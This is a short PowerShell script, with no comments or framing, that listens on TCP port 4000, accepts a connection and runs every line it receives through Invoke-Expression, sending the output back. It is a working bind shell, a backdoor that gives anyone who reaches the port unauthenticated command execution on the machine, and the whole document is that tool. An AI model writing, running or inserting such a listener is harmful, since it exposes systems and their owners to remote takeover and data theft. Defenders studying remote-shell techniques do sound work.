$server = [System.Net.Sockets.TcpListener]::new(4000)
$server.Start()
$socket = $server.Server.Accept()

while ( $true ) {
    if ( $bytes = $socket.Available ){
        $bytearray = [byte[]]::new($bytes)
        $socket.Receive($bytearray)
        $command = ( [char[]]$bytearray -join "" ).Trim()
        $response = Invoke-Expression "$command | Out-String"
        $socket.Send( [char[]]$response )
    }
    Start-Sleep -Seconds 2
}

$socket.Close()
$server.Stop()
